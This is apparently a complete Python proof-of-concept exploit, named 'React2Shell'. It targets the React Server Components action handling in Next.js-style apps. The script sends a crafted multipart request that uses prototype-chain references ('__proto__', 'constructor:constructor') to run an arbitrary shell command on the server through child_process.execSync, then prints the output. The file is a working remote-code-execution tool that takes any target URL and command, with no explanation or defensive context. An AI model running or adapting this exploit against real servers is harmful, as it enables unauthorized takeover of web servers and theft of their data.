import argparse
import sys
import requests
import json

def exploit(url:str, command:str):
    # Header manipulation
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
        "next-action":"x",
    }
    # payload injection
    payload = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": "{\"then\":\"$B1337\"}",
        "_response": {
            "_prefix": f"var res=process.mainModule.require('child_process').execSync('{command}',{{'timeout':5000}}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
            "_chunks": "$B1",
            "_formData": {
            "get": "$1:constructor:constructor"
            }
        }
    }

    files = {
    "0": (None, json.dumps(payload)),
    "1": (None, '"$@0"'),
}

    # Sending the request
    try:
        resp = requests.post(url, headers=headers, files=files, timeout=10, verify=False)
    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit(1)
    print(resp.text)
    return True

def main():
    parser = argparse.ArgumentParser(description='React2Shell POC customized by DanielTr')
    parser.add_argument('--target', '-t', type=str, required=True, help='The target URL to send the payload to')
    parser.add_argument('--command', '-c', type=str, required=True, help='The command to be executed on the target server')
    args = parser.parse_args()

    # Executing the payload
    exploit(args.target, args.command)

    sys.exit(0)

if __name__ == '__main__':
    main()